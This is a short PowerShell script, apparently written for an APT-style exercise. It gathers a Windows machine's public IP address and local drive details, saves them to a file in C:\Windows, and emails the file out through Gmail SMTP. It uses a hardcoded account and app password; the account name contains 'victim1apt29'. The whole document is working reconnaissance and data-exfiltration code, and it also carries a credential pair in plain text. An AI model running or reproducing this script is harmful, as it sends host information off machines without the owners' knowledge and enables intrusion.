# Get the public IP address using ipconfig.me
$ipAddress = Invoke-RestMethod -Uri 'https://ifconfig.me'

# Get the active drive information using WMIC
$driveInfo = Get-WmiObject -Class Win32_LogicalDisk -Filter "DriveType=3" | Select-Object DeviceID, VolumeName, Size, FreeSpace

# Save the information to MySystem.txt in the Windows directory
$outFile = "C:\Windows\MySystem.txt"
"$ipAddress" | Out-File -FilePath $outFile
$driveInfo | Out-File -FilePath $outFile -Append

$Username = "victim1apt29@gmail.com";
$Password = "dhab vkvx tjng xydx";
$path = "C:\Windows\MySystem.txt";

function Send-ToEmail([string]$email, [string]$attachmentpath){

    $message = new-object Net.Mail.MailMessage;
    $message.From = "victim1apt29@gmail.com";
    $message.To.Add($email);
    $message.Subject = "MySystem.txt";
    $message.Body = "IP Address & Active Drive.";
    $attachment = New-Object Net.Mail.Attachment($attachmentpath);
    $message.Attachments.Add($attachment);

    $smtp = new-object Net.Mail.SmtpClient("smtp.gmail.com", "587");
    $smtp.EnableSSL = $true;
    $smtp.Credentials = New-Object System.Net.NetworkCredential($Username, $Password);
    $smtp.send($message);
    write-host "Mail Sent" ; 
    $attachment.Dispose();
 }
Send-ToEmail  -email "victim1apt29@gmail.com" -attachmentpath $path;